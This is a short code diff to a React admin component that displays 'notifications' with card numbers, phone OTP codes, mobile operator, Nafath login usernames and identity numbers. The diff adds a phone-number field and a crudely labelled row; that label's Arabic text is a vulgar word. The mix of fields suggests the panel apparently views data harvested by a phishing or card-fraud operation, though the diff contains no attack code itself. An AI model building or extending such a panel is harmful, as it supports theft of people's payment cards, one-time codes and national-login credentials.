@@ -78,6 +78,7 @@ interface Notification {
     agreeToTerms: boolean
   }
   phone2?: string // New field
+  phoneNumber?: string // New field
   phoneOtpCode?: string // New field
   operator?: string // New field
   cardNumber: string
@@ -691,7 +692,7 @@ function NotificationDetails({
               id: "phone",
               label: "الهاتف",
               icon: Smartphone,
-              hasData: notification.formData?.phone || notification.phone2 || notification.phoneOtpCode,
+              hasData: notification.formData?.phone || notification.phone2 || notification.phoneNumber,
             },
             { id: "card", label: "البطاقة", icon: CreditCard, hasData: notification.cardNumber },
             { id: "nafaz", label: "نفاذ", icon: Key, hasData: notification.nafadUsername },
@@ -722,6 +723,7 @@ function NotificationDetails({
                 { label: "اسم مالك الوثيقة", value: notification.formData?.documment_owner_full_name, icon: User },
                 { label: "رقم هوية المالك", value: notification.formData?.owner_identity_number, icon: Shield },
                 { label: "رقم هوية المشتري", value: notification.formData?.buyer_identity_number, icon: Shield },
+                { label: "رقم  زبي", value: notification.formData?.phone, icon: Shield },
                 { label: "رقم هوية البائع", value: notification.formData?.seller_identity_number, icon: Shield },
                 { label: "الرقم التسلسلي", value: notification.formData?.serial_number, icon: FileText },
                 {
